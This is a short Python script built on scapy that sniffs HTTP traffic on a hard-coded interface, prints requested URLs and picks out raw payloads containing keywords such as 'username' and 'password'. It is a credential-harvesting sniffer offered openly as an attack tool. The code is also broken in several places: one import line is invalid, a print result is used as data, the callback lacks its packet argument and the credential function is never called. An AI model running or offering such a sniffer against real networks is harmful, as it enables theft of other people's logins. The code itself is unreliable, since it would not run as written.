#!/usr/bin/env python3

import scapy.all as scapy
import scapy.layers import http

def sniff(interface):
#store=False arg tells scapy to not store packets
#prn arg allows call back func to be executed every time packet is captured
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
                            
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
#only displaying packets with Raw layer
    if packet.haslayer(scapy.Raw):
#scapy.Raw will only print the raw layer of the packet no additional info
#.load will only print load info from raw layer
        load = print(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet():
#print only HTTPRequest packets
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

#sniff interface (hardcoded)
sniff("eth0")